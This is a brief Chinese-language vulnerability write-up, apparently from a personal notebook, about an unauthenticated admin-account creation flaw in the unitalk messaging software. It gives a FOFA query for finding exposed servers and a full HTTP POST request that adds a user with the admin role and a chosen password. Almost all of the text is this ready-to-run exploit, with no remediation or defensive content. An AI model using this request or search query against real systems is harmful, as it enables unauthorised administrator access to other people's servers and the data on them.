# unitalk存在任意用户添加漏洞

# 一、漏洞简介
unitalk是一款即时通讯软件，unitalk存在任意用户添加漏洞

# 二、影响版本
+ unitalk

# 三、资产测绘
+ fofa`title="unitalk"`
+ 特征

![1723520849027-9f8e29d4-1ac6-46e0-b014-eb6ac435cc13.png](./img/21G5icesDMJ_SYeY/1723520849027-9f8e29d4-1ac6-46e0-b014-eb6ac435cc13-275032.png)

# 四、漏洞复现
```plain
POST /unitalk/v1.0/user/add.json HTTP/1.1
Host: 
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Length: 62

{"name":"admin123","role":"admin","pwd":"admin123","token":""}
```

![1723521483724-f75815f8-4d99-4335-9f9e-a9e515d80f87.png](./img/21G5icesDMJ_SYeY/1723521483724-f75815f8-4d99-4335-9f9e-a9e515d80f87-382491.png)



> 更新: 2024-09-05 23:21:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/liqozczwz3ct02br>